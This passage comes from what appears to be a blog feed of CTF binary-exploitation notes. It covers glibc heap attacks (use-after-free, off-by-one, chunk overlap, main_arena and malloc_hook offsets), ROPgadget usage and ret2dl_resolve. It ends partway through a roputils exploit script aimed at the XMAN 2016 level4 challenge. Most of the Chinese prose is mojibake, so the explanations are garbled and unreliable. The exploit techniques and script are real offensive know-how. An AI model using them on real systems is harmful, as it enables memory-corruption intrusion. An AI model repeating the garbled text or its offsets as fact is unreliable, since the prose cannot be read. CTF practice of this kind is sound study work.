†å—åï¼Œå¹¶æ²¡æœ‰å°†è¯¥æŒ‡é’ˆç½®ä¸ºNULLï¼Œè¿™æ ·å¯¼è‡´è¯¥æŒ‡é’ˆå¤„äºæ‚¬ç©ºçš„çŠ¶æ€ï¼ŒåŒæ ·è¢«é‡Šæ”¾çš„å†…å­˜å¦‚æœè¢«æ¶æ„æ„é€ æ•°æ®ï¼Œå°±æœ‰å¯èƒ½ä¼šè¢«åˆ©ç”¨ã€‚ </p><p>æ ¹æœ¬åŸå› ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åº”ç”¨ç¨‹åºè°ƒç”¨free()é‡Šæ”¾å†…å­˜æ—¶ï¼Œå¦‚æœå†…å­˜å—å°äº256kbï¼Œdlmallocå¹¶ä¸é©¬ä¸Šå°†å†…å­˜å—é‡Šæ”¾å›å†…å­˜ï¼Œè€Œæ˜¯å°†å†…å­˜å—æ ‡è®°ä¸ºç©ºé—²çŠ¶æ€ã€‚è¿™ä¹ˆåšçš„åŸå› æœ‰ä¸¤ä¸ªï¼šä¸€æ˜¯å†…å­˜å—ä¸ä¸€å®šèƒ½é©¬ä¸Šé‡Šæ”¾ä¼šå†…æ ¸ï¼ˆæ¯”å¦‚å†…å­˜å—ä¸æ˜¯ä½äºå †é¡¶ç«¯ï¼‰ï¼ŒäºŒæ˜¯ä¾›åº”ç”¨ç¨‹åºä¸‹æ¬¡ç”³è¯·å†…å­˜ä½¿ç”¨ï¼ˆè¿™æ˜¯ä¸»è¦åŸå› ï¼‰ã€‚å½“dlmallocä¸­ç©ºé—²å†…å­˜é‡è¾¾åˆ°ä¸€å®šå€¼æ—¶dlmallocæ‰å°†ç©ºé—²å†…å­˜é‡Šæ”¾ä¼šå†…æ ¸ã€‚å¦‚æœåº”ç”¨ç¨‹åºç”³è¯·çš„å†…å­˜å¤§äº256kbï¼Œdlmallocè°ƒç”¨mmap()å‘å†…æ ¸ç”³è¯·ä¸€å—å†…å­˜ï¼Œè¿”å›è¿”è¿˜ç»™åº”ç”¨ç¨‹åºä½¿ç”¨ã€‚å¦‚æœåº”ç”¨ç¨‹åºé‡Šæ”¾çš„å†…å­˜å¤§äº256kbï¼Œdlmallocé©¬ä¸Šè°ƒç”¨munmap()é‡Šæ”¾å†…å­˜ã€‚dlmallocä¸ä¼šç¼“å­˜å¤§äº256kbçš„å†…å­˜å—ï¼Œå› ä¸ºè¿™æ ·çš„å†…å­˜å—å¤ªå¤§äº†ï¼Œæœ€å¥½ä¸è¦é•¿æœŸå ç”¨è¿™ä¹ˆå¤§çš„å†…å­˜èµ„æºã€‚</span><br></pre></td></tr></table></figure><p>ï¼ˆæ‰€ä»¥ä½ çœ‹åˆ°çš„æŸäº›ptr = null  , ptr = 0ã€‚ ç„¶åè¿›å…¥åˆ°å †å—é‡ŒæŸ¥çœ‹å†…å®¹ï¼Œå‘ç°å †å—é‡Œçš„å†…å®¹è¿˜æ˜¯èƒ½çœ‹å¾—åˆ°ä»¥å‰å†™å…¥çš„æ•°æ®ï¼Œä½†æ˜¯ä¸èƒ½è¯»å–ï¼Œå°±æ˜¯è¿™äº†ã€‚å®ƒè¢«æ‰“ä¸Šäº†ç©ºé—²æ ‡è®°ï¼Œä½†æ˜¯æ²¡æœ‰çœŸæ­£æ¸…é™¤ï¼ˆå¤§æ¦‚æ˜¯è¿™ä¸ªæ„æ€å§ï¼Ÿï¼‰ï¼‰</p><p>ä¸€ç§æ˜¯ç›´æ¥è¿›è¡Œfreeï¼Œä¸”æ²¡æœ‰è¿›è¡Œä»»ä½•é™åˆ¶çš„</p><img src="/2019/10/29/â€œå †çš„æ•´ç†â€/image-20191103123730845.png"><img src="/2019/10/29/â€œå †çš„æ•´ç†â€/image-20191103125527078.png"><p>è¿™ç§ç›´æ¥malloc,delete,showã€‚</p><p>å¦ä¸€ç§å°±æ˜¯*æ²¡æ‚¬ç©ºï¼Œå…¶ä»–è¯¥ç½®é›¶çš„ç½®é›¶ã€‚</p><p>UAFé…åˆfasted binçš„cyclic list(double free)</p><h4 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off by one"></a>off by one</h4><p>off by one é…åˆchunk overlap ï¼›unlink</p><h3 id="å †çš„æ‚è®°"><a href="#å †çš„æ‚è®°" class="headerlink" title="å †çš„æ‚è®°"></a>å †çš„æ‚è®°</h3><p>æ³¨æ„ä¸€ç‚¹ã€‚</p><p>åŠ¨æ€é“¾æ¥:</p><p>ç¬¬ä¸€æ¬¡æ”¾å…¥unsorted biné‡Œé¢çš„å †å—åœ°å€è·ç¦»main_arenaä¸º0x58</p><p>main_arena = leak_addr - 0x58</p><p>malloc_hook_addr = main_arena_addr - 0x10</p><p>é™æ€é“¾æ¥:</p><p>ç¬¬ä¸€æ¬¡æ”¾å…¥unsorted biné‡Œé¢çš„å †å—åœ°å€è·ç¦»malloc_hookä¸º0xD0</p><h3 id="overlapping"><a href="#overlapping" class="headerlink" title="overlapping"></a>overlapping</h3><p>å‰å‘:</p><p>ä¿®æ”¹ç¬¬ä¸€ä¸ªå †å—çš„sizeä½å³å¯</p><p>åå‘:</p><p>ä¿®æ”¹è¦è¦†ç›–çš„æœ€åä¸€ä¸ªå †å—çš„pä½å’Œprev_sizeä½å³å¯ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å¤ç°é¢˜ç›®ä¸­æ¢ç©¶çš„ä¸€äº›æ‚è®°</title>
      <link href="/2019/10/29/%E2%80%9D%E5%A4%8D%E7%8E%B0%E9%A2%98%E7%9B%AE%E4%B8%AD%E6%8E%A2%E7%A9%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%9D%82%E8%AE%B0%E2%80%9C/"/>
      <url>/2019/10/29/%E2%80%9D%E5%A4%8D%E7%8E%B0%E9%A2%98%E7%9B%AE%E4%B8%AD%E6%8E%A2%E7%A9%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%9D%82%E8%AE%B0%E2%80%9C/</url>
      
        <content type="html"><![CDATA[<p>è®°å½•ä¸€ç‚¹è‡ªå·±çš„ç–‘éš¾ç‚¹ï¼Œè¶Šå­¦çœŸçš„æ˜¯è¶Šå‘æ„Ÿè§‰è‡ªå·±çš„èœã€‚</p><h3 id="æ‚è®°1"><a href="#æ‚è®°1" class="headerlink" title="æ‚è®°1"></a>æ‚è®°1</h3><p>ä¾‹å¦‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">init();</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr1 = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">target = ptr1;</span><br><span class="line">ptr1[<span class="number">0</span>+<span class="number">0x10</span>] = <span class="number">0x66</span>;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„çš„ptr1[0+0x10]æ˜¯å¯¹ä¸‹æ ‡ç´¢å¼•çš„æ“ä½œï¼ˆå°±æ˜¯æŒ‡é’ˆï¼‰ã€‚[]é‡Œç§»åŠ¨0x01åœ¨64ä½é‡Œå°±æ˜¯8å­—èŠ‚å…‰æ ‡çš„ç§»åŠ¨</p><h3 id="æ‚è®°2"><a href="#æ‚è®°2" class="headerlink" title="æ‚è®°2"></a>æ‚è®°2</h3><p>é™æ€ç¼–è¯‘ä¸­hookçš„æ‰¾æ³•</p><img src="/2019/10/29/â€å¤ç°é¢˜ç›®ä¸­æ¢ç©¶çš„ä¸€äº›æ‚è®°â€œ/QQå›¾ç‰‡20191114200718.png"><img src="/2019/10/29/â€å¤ç°é¢˜ç›®ä¸­æ¢ç©¶çš„ä¸€äº›æ‚è®°â€œ/QQå›¾ç‰‡20191114200746.png"><h3 id="æ‚è®°3"><a href="#æ‚è®°3" class="headerlink" title="æ‚è®°3"></a>æ‚è®°3</h3><p> mprotect(add,len,prot)rdi = add ï¼› rsi = len ï¼›rdx = protï¼› </p><p> prot=7 æ˜¯å¯è¯»å¯å†™å¯æ‰§è¡Œ </p><h3 id="scanf"><a href="#scanf" class="headerlink" title="scanf"></a>scanf</h3><p>åœ¨linux 16ç‰ˆæœ¬ä¸­ï¼Œscanfè¾“å…¥çš„æ•°æ®è¿‡å¤§è¶…è¿‡linuxæ ˆç©ºé—´çš„æœ€å¤§å€¼ï¼ˆ8mï¼‰ï¼Œå°±ä¼šè‡ªåŠ¨è°ƒç”¨å †å—æ¥å‚¨å­˜æ•°æ®ã€‚</p><p>åœ¨64ä½ç³»ç»Ÿä¸‹ï¼Œsmall bin &lt;0x400</p><p>åœ¨32ä½ç³»ç»Ÿä¸‹ï¼Œsmall bin &lt;0x200</p><p>æ‰€ä»¥ä½ è¾“å…¥0x400å­—èŠ‚æ•°æ®ï¼Œå°±ä¼šè§¦å‘malloc_consolidateï¼Œä½¿å¾—fasted biné‡Œçš„å †å—åˆå¹¶åˆ°unsorted biné‡Œé¢ã€‚</p><h3 id="ç›´æ¥åˆ©ç”¨ROPgadgetåœ¨libcé‡Œæ‰¾gadgetåç§»"><a href="#ç›´æ¥åˆ©ç”¨ROPgadgetåœ¨libcé‡Œæ‰¾gadgetåç§»" class="headerlink" title="ç›´æ¥åˆ©ç”¨ROPgadgetåœ¨libcé‡Œæ‰¾gadgetåç§»"></a>ç›´æ¥åˆ©ç”¨ROPgadgetåœ¨libcé‡Œæ‰¾gadgetåç§»</h3><p>åœ¨è·å–åˆ°äº†libcåŸºå€åï¼Œå°±å¯ä»¥ç›´æ¥åˆ©ç”¨ROPgadgetåœ¨libcé‡Œå¯»æ‰¾åç§»äº†ã€‚</p><p>æŒ‡ä»¤å¦‚ä¸‹ï¼š</p><p>å…ˆåˆ›å»ºä¸€ä¸ªlibc.gadgetæ–‡ä»¶ï¼Œå‚¨å­˜libcé‡Œçš„gadget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary libc-2.23.so&gt;libc.gadget</span><br></pre></td></tr></table></figure><p><img src="D:%5Cblog%5CHexo%5Csource_posts%5C%E2%80%9D%E5%A4%8D%E7%8E%B0%E9%A2%98%E7%9B%AE%E4%B8%AD%E6%8E%A2%E7%A9%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%9D%82%E8%AE%B0%E2%80%9C%5Cimage-20191202235533413.png" alt="image-20191202235533413"></p><p>å†åˆ©ç”¨grpeå¯»æ‰¾éœ€è¦çš„gadget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;pop rdi ; ret&quot; libc.gadget</span><br></pre></td></tr></table></figure><p><img src="D:%5Cblog%5CHexo%5Csource_posts%5C%E2%80%9D%E5%A4%8D%E7%8E%B0%E9%A2%98%E7%9B%AE%E4%B8%AD%E6%8E%A2%E7%A9%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%9D%82%E8%AE%B0%E2%80%9C%5Cimage-20191202235612002.png" alt="image-20191202235612002"></p><p>å½“ç„¶ï¼ä½ ä¹Ÿå¯ä»¥ç”¨å¦ä¸€ç§æ–¹æ³•ã€‚</p><p>çŸ¥é“libc_baseåï¼Œè¦è·å–pop rdi;retè¿™ç§ï¼Œç›´æ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop_rdx_ret = libc + lib.search(asm(<span class="string">"pop rdx\nret"</span>)).next()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å¯¹äºret2dl_resolveçš„æ¢ç©¶</title>
      <link href="/2019/10/28/%E5%AF%B9%E4%BA%8Eret2-resolve%E7%9A%84%E6%8E%A2%E7%A9%B6/"/>
      <url>/2019/10/28/%E5%AF%B9%E4%BA%8Eret2-resolve%E7%9A%84%E6%8E%A2%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<p>å…³äºret2dl_resolveçš„ç ”ç©¶ï¼Œå…¶å®æˆ‘ä¸ªäººçœ‹çš„ä¸æ˜¯å¾ˆæ‡‚ï¼Œè¿™é‡Œç®—æ˜¯ç®€å•è®°å½•ä¸€ä¸‹è€Œå·²ã€‚</p><p>ç­‰ä»€ä¹ˆæ—¶å€™çœŸæ­£çœ‹æ‡‚äº†ï¼Œå†è¡¥ä¸Šå§ã€‚</p><p>ç½‘ç»œä¸Šå‰è¾ˆçš„æ•™ç¨‹ï¼š</p><blockquote><p><a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/" target="_blank" rel="noopener">http://rk700.github.io/2015/08/09/return-to-dl-resolve/</a><br><a href="http://angelboy.logdown.com/posts/283218-return-to-dl-resolve" target="_blank" rel="noopener">http://angelboy.logdown.com/posts/283218-return-to-dl-resolve</a><br><a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a><br><a href="https://github.com/inaz2/roputils/blob/master/roputils.py" target="_blank" rel="noopener">https://github.com/inaz2/roputils/blob/master/roputils.py</a></p></blockquote><p>å…·ä½“çš„ï¼Œå‰è¾ˆä»¬å·²ç»ä»‹ç»çš„å¾ˆè¯¦ç»†äº†ï¼Œåœ¨è¿™é‡Œï¼Œæˆ‘åªæ˜¯èµ˜è¿°è‡ªå·±å­¦åˆ°çš„ï¼Œæ•´ç†ä¸€ä¸‹è‡ªå·±èƒ½ç®€å•ç†è§£çš„ä¸œè¥¿</p><h1 id="ret2dl-resolveçš„æ ¸å¿ƒåŸç†"><a href="#ret2dl-resolveçš„æ ¸å¿ƒåŸç†" class="headerlink" title="ret2dl_resolveçš„æ ¸å¿ƒåŸç†"></a>ret2dl_resolveçš„æ ¸å¿ƒåŸç†</h1><p> ret2dl-resolveçš„æ ¸å¿ƒåŸç†æ˜¯æ”»å‡»ç¬¦å·é‡å®šä½æµç¨‹ï¼Œä½¿å…¶è§£æåº“ä¸­å­˜åœ¨çš„ä»»æ„å‡½æ•°åœ°å€ï¼Œä»è€Œå®ç°gotè¡¨çš„åŠ«æŒã€‚ </p><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><h2 id="ä¸ºä»€ä¹ˆè¦è®¾ç½®å»¶è¿Ÿç»‘å®š"><a href="#ä¸ºä»€ä¹ˆè¦è®¾ç½®å»¶è¿Ÿç»‘å®š" class="headerlink" title="ä¸ºä»€ä¹ˆè¦è®¾ç½®å»¶è¿Ÿç»‘å®š"></a>ä¸ºä»€ä¹ˆè¦è®¾ç½®å»¶è¿Ÿç»‘å®š</h2><p>â€‹        è¦æƒ³å›ç­”è¿™ä¸ªé—®é¢˜ï¼Œé¦–å…ˆæˆ‘ä»¬å¾—ä»åŠ¨æ€é“¾æ¥è¯´èµ·ã€‚ä¸ºäº†å‡å°‘å­˜å‚¨å™¨æµªè´¹ï¼Œç°ä»£æ“ä½œç³»ç»Ÿæ”¯æŒåŠ¨æ€é“¾æ¥ç‰¹æ€§ã€‚å³ä¸æ˜¯åœ¨ç¨‹åºç¼–è¯‘çš„æ—¶å€™å°±æŠŠå¤–éƒ¨çš„åº“å‡½æ•°ç¼–è¯‘è¿›å»ï¼Œè€Œæ˜¯åœ¨è¿è¡Œæ—¶å†æŠŠåŒ…å«æœ‰å¯¹åº”å‡½æ•°çš„åº“åŠ è½½åˆ°å†…å­˜é‡Œã€‚ç”±äºå†…å­˜ç©ºé—´æœ‰é™ï¼Œé€‰ç”¨å‡½æ•°åº“çš„ç»„åˆæ— é™ï¼Œæ˜¾ç„¶ç¨‹åºä¸å¯èƒ½åœ¨è¿è¡Œä¹‹å‰å°±çŸ¥é“è‡ªå·±ç”¨åˆ°çš„å‡½æ•°ä¼šåœ¨å“ªä¸ªåœ°å€ä¸Šã€‚</p><p>â€‹        æ¯”å¦‚è¯´å¯¹äºlibc.soæ¥è¯´ï¼Œæˆ‘ä»¬è¦æ±‚æŠŠå®ƒåŠ è½½åˆ°åœ°å€0x1000å¤„ï¼ŒAç¨‹åºåªå¼•ç”¨äº†libc.soï¼Œä»ç†è®ºä¸Šæ¥è¯´è¿™ä¸ªè¦æ±‚ä¸éš¾åŠåˆ°ã€‚ä½†æ˜¯å¯¹äºç”¨äº†liba,so, libb.so, libc.soâ€¦â€¦liby.so, libz.soçš„Bç¨‹åºæ¥è¯´ï¼Œ0x1000è¿™ä¸ªåœ°å€å¯èƒ½å°±è¢«liba.soç­‰åº“å æ®äº†ã€‚å› æ­¤ï¼Œç¨‹åºåœ¨è¿è¡Œæ—¶ç¢°åˆ°äº†å¤–éƒ¨ç¬¦å·ï¼Œå°±éœ€è¦å»æ‰¾åˆ°å®ƒä»¬çœŸæ­£çš„å†…å­˜åœ°å€ï¼Œè¿™ä¸ªè¿‡ç¨‹è¢«ç§°ä¸ºé‡å®šä½ã€‚</p><p>â€‹        ä¸ºäº†å®‰å…¨ï¼Œç°ä»£æ“ä½œç³»ç»Ÿçš„è®¾è®¡è¦æ±‚ä»£ç æ‰€åœ¨çš„å†…å­˜å¿…é¡»æ˜¯ä¸å¯ä¿®æ”¹çš„ï¼Œé‚£ä¹ˆè¯¸å¦‚call readä¸€ç±»çš„æŒ‡ä»¤å³æ²¡åŠæ³•åœ¨ç¼–è¯‘é˜¶æ®µç›´æ¥æŒ‡å‘readå‡½æ•°æ‰€åœ¨åœ°å€ï¼Œåˆæ²¡åŠæ³•åœ¨è¿è¡Œæ—¶ä¿®æ”¹æˆreadå‡½æ•°æ‰€åœ¨åœ°å€ï¼Œæ€ä¹ˆä¿è¯CPUåœ¨è¿è¡Œåˆ°è¿™è¡ŒæŒ‡ä»¤æ—¶èƒ½æ­£ç¡®è·³åˆ°readå‡½æ•°å‘¢ï¼Ÿè¿™å°±éœ€è¦gotè¡¨ï¼ˆGlobal Offset Tableï¼Œå…¨å±€åç§»è¡¨ï¼‰å’Œpltè¡¨ï¼ˆProcedure Linkage Tableï¼Œè¿‡ç¨‹é“¾æ¥è¡¨ï¼‰è¿›è¡Œè¾…åŠ©äº†ã€‚ </p><p>â€‹         åœ¨å»¶è¿ŸåŠ è½½çš„æƒ…å†µä¸‹ï¼Œæ¯ä¸ªå¤–éƒ¨å‡½æ•°çš„gotè¡¨éƒ½ä¼šè¢«åˆå§‹åŒ–æˆpltè¡¨ä¸­å¯¹åº”é¡¹çš„åœ°å€ã€‚å½“callæŒ‡ä»¤æ‰§è¡Œæ—¶ï¼ŒEIPç›´æ¥è·³è½¬åˆ°pltè¡¨çš„ä¸€ä¸ªjmpï¼Œè¿™ä¸ªjmpç›´æ¥æŒ‡å‘å¯¹åº”çš„gotè¡¨åœ°å€ï¼Œä»è¿™ä¸ªåœ°å€å–å€¼ã€‚æ­¤æ—¶è¿™ä¸ªjmpä¼šè·³åˆ°ä¿å­˜å¥½çš„ï¼Œpltè¡¨ä¸­å¯¹åº”é¡¹çš„åœ°å€ï¼Œåœ¨è¿™é‡ŒæŠŠæ¯ä¸ªå‡½æ•°é‡å®šä½è¿‡ç¨‹ä¸­å”¯ä¸€çš„ä¸åŒç‚¹ï¼Œå³ä¸€ä¸ªæ•°å­—å…¥æ ˆï¼ˆæœ¬ä¾‹å­ä¸­writeæ˜¯18h,readæ˜¯0ï¼Œå¯¹äºå•ä¸ªç¨‹åºæ¥è¯´ï¼Œè¿™ä¸ªæ•°å­—æ˜¯ä¸å˜çš„ï¼‰ï¼Œç„¶åpush got[1]å¹¶è·³è½¬åˆ°got[2]ä¿å­˜çš„åœ°å€ã€‚åœ¨è¿™ä¸ªåœ°å€ä¸­å¯¹å‡½æ•°è¿›è¡Œäº†é‡å®šä½ï¼Œå¹¶ä¸”ä¿®æ”¹gotè¡¨ä¸ºçœŸæ­£çš„å‡½æ•°åœ°å€ã€‚å½“ç¬¬äºŒæ¬¡è°ƒç”¨åŒä¸€ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œcallä»ç„¶ä½¿EIPè·³è½¬åˆ°pltè¡¨çš„åŒä¸€ä¸ªjmpï¼Œä¸åŒçš„æ˜¯è¿™å›ä»gotè¡¨å–å€¼å–åˆ°çš„æ˜¯çœŸæ­£çš„åœ°å€ï¼Œä»è€Œé¿å…é‡å¤è¿›è¡Œé‡å®šä½ã€‚ </p><p>è¿›è¡Œè·Ÿè¿›åˆ†æåï¼Œå‘ç°ï¼Œä¸»è¦å½±å“é‡å®šä½çš„ï¼Œæ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (</span><br><span class="line"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br><span class="line">           ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"># endif</span><br><span class="line">           struct link_map *__unbounded l, ElfW(Word) reloc_arg)</span><br></pre></td></tr></table></figure><p>ä¸­çš„reloc_argï¼Œ æˆ‘ä»¬ä¸»è¦æ§åˆ¶reloc_argè¿›è¡Œæ”»å‡»ã€‚</p><h1 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/3i read 0x80482f0 &lt;read@plt&gt;:        jmp    DWORD PTR ds:0x804970c</span><br><span class="line">   0x80482f6 &lt;read@plt+6&gt;:      push   0x0</span><br><span class="line">   0x80482fb &lt;read@plt+11&gt;:     jmp    0x80482e0</span><br><span class="line">gdb-peda$ x/wx 0x804970c</span><br><span class="line">0x804970c &lt;read@got.plt&gt;:       0x080482f6</span><br><span class="line">gdb-peda$ x/2i 0x80482e0</span><br><span class="line">   0x80482e0:   push   DWORD PTR ds:0x8049704</span><br><span class="line">   0x80482e6:   jmp    DWORD PTR ds:0x8049708</span><br></pre></td></tr></table></figure><p>åœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶ï¼Œ<code>jmp read@got.plt</code>ä¼šè·³å›<code>read@plt</code>ï¼Œè¿™æ˜¯æˆ‘ä»¬å·²ç»çŸ¥é“çš„ã€‚æ¥ä¸‹æ¥ï¼Œä¼šå°†å‚æ•°pushåˆ°æ ˆä¸Šå¹¶è·³è‡³<code>.got.plt+0x8</code>ï¼Œè¿™ç›¸å½“äºè°ƒç”¨ä»¥ä¸‹å‡½æ•°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_runtime_resolve(link_map, rel_offset);</span><br></pre></td></tr></table></figure><p>â€‹        </p><p>â€‹        è¿™å°±æ˜¯é‡å®šä½ç¬¦å·è¡¨ï¼Œå› ä¸ºç¬¬ä¸€æ¬¡è°ƒç”¨å‡½æ•°çš„æ—¶å€™ï¼Œå¹¶ä¸æ˜¯ç›´æ¥è·³è½¬åˆ°libcç©ºé—´ä¸­çš„å‡½æ•°ï¼Œè€Œæ˜¯åœ¨è¿™ä¸ªå‡½æ•°è¢«è°ƒç”¨äº†ï¼Œæ‰å»æŠŠè¿™ä¸ªå‡½æ•°åœ¨libcçš„åœ°å€æ”¾åˆ°GOTè¡¨ä¸­ã€‚æ¥ä¸‹æ¥ï¼Œä¼šé€šè¿‡ä¸¤æ¬¡pushï¼Œæœ€åè·³åˆ°libcçš„_dl_runtime_resolveå»æ‰§è¡Œã€‚_dl_runtime_resolveçš„ç›®çš„ï¼Œæ˜¯æ ¹æ®push çš„ä¸¤ä¸ªå‚æ•°å¯¼å‡ºå‡½æ•°çš„åœ°å€ï¼Œç„¶åæ”¾åˆ°ç›¸åº”çš„GOTè¡¨ï¼Œå¹¶ä¸”è°ƒç”¨å®ƒã€‚ </p><p>é‚£ä¹ˆï¼Œæˆ‘ä»¬çš„æ€è·¯æ˜¯åœ¨å†…å­˜ä¸­ä¼ªé€ Elf32_Relå’ŒElf32_Symä¸¤ä¸ªç»“æ„ä½“ï¼Œå¹¶æ‰‹åŠ¨ä¼ é€’reloc_argä½¿å…¶æŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„ç»“æ„ä½“ï¼Œè®©Elf32_Sym.st_nameçš„åç§»å€¼æŒ‡å‘é¢„å…ˆæ”¾åœ¨å†…å­˜ä¸­çš„å­—ç¬¦ä¸²systemå®Œæˆæ”»å‡»ã€‚ </p><h1 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h1><p>â€‹        æ–¹æ³•å˜æˆäº†è¦†ç›– (link_map + 0x1c8) å¤„ä¸º NULL, ä¹Ÿå°±æ˜¯<code>if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)</code>è¿™ä¸€å¥.<br>â€‹        ä½†æ˜¯link_mapæ˜¯åœ¨ld.soä¸Šçš„,å› æ­¤æˆ‘ä»¬éœ€è¦leak,è‹¥ç¨‹åºæ²¡æœ‰è¾“å‡ºå‡½æ•°,åˆ™æ— æ³•ä½¿ç”¨è¿™ä¸ªæ–¹æ³•. </p><h1 id="ä½¿ç”¨ROPutilsç®€åŒ–æ”»å‡»æ­¥éª¤"><a href="#ä½¿ç”¨ROPutilsç®€åŒ–æ”»å‡»æ­¥éª¤" class="headerlink" title="ä½¿ç”¨ROPutilsç®€åŒ–æ”»å‡»æ­¥éª¤"></a>ä½¿ç”¨ROPutilsç®€åŒ–æ”»å‡»æ­¥éª¤</h1><p>ä½¿ç”¨é€šå¸¸çš„æ„é€ payloadè¿‡ç¨‹ç¹çï¼Œè™½ç„¶æ ¼å¼åŒ–ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸åˆ©äºæˆ‘ä»¬ç¼–å†™ã€‚æ•…æ­¤ï¼Œæˆ‘ä»¬ä½¿ç”¨roputils.pyè¿™ä¸ªæ¨¡å—è¿›è¡Œret2_dl_resolveæ”»å‡»</p><p>ä»¥ XMAN 2016-level3/level4 ä¸ºä¾‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#ä¸ºäº†é˜²æ­¢å‘½åå†²çªï¼Œè¿™ä¸ªè„šæœ¬å…¨éƒ¨åªä½¿ç”¨roputilsä¸­çš„ä»£ç ã€‚å¦‚æœéœ€è¦ä½¿ç”¨pwntoolsä¸­çš„ä»£ç éœ€è¦åœ¨import roputilså‰import pwnï¼Œä»¥ä½¿å¾—roputilsä¸­çš„ROPè¦†ç›–æ‰pwntoolsä¸­çš„ROP</span></span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">'./level4'</span>)                        <span class="comment">#ROPç»§æ‰¿äº†ELFç±»ï¼Œä¸‹é¢çš„section, got, pltéƒ½æ˜¯è°ƒç”¨çˆ¶ç±»çš„æ–¹æ³•</span></span><br><span class="line">bss_addr = rop.section(<span class="string">'.bss'</span>)</span><br><span class="line">read_got = rop.got(<span class="string">'read'</span>)</span><br><span class="line">read_plt = rop.plt(<span class="string">'read'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">140</span></span><br><span class="line"></span><br><span class="line">io = Proc(host = <span class="string">'172.17.0.2'</span>, port = <span class="number">10001</span>)        <span class="comment">#roputilsä¸­è¿™é‡Œéœ€è¦æ˜¾å¼æŒ‡å®šå‚æ•°å</span></span><br><span class="line"></span><br><span class="line">buf = rop.fill(offset)                        <span class="comment">#fillç”¨äºç”Ÿæˆå¡«å……æ•°æ®</span></span><br><span class="line">buf += rop.call(read_plt, <span class="number">0</span>, bss_addr, <span class="number">0x100</span>)        <span class="comment">#callå¯ä»¥é€šè¿‡æŸä¸ªå‡½æ•°çš„pltåœ°å€æ–¹ä¾¿åœ°è¿›è¡Œè°ƒç”¨</span></span><br><span class="line">buf += rop.dl_resolve_call(bss_addr+<span class="number">0x20</span>, bss_addr)        <span class="comment">#dl_resolve_callæœ‰ä¸€ä¸ªå‚æ•°baseå’Œä¸€ä¸ªå¯é€‰å‚æ•°åˆ—è¡¨*argsã€‚baseä¸ºä¼ªé€ çš„link_mapæ‰€åœ¨åœ°å€ï¼Œ*argsä¸ºè¦ä¼ 